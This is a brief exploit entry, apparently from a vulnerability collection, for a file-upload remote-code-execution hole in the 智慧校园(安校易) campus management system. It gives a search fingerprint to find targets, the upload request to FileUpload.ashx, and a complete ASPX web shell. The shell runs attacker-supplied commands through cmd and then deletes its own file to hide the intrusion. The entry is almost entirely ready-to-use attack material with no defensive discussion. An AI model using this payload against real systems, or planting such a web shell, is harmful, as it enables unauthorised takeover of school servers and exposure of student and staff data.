# 智慧校园(安校易)管理系统FileUpload.ashx存在文件上传致RCE漏洞

- **系统**：智慧校园(安校易)管理系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="智慧综合管理平台登入"`
- **请求**：`POST /Tool/FileUpload.ashx?action=PhotoByte&ext=1.aspx HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
```
- **预期**：200　|　—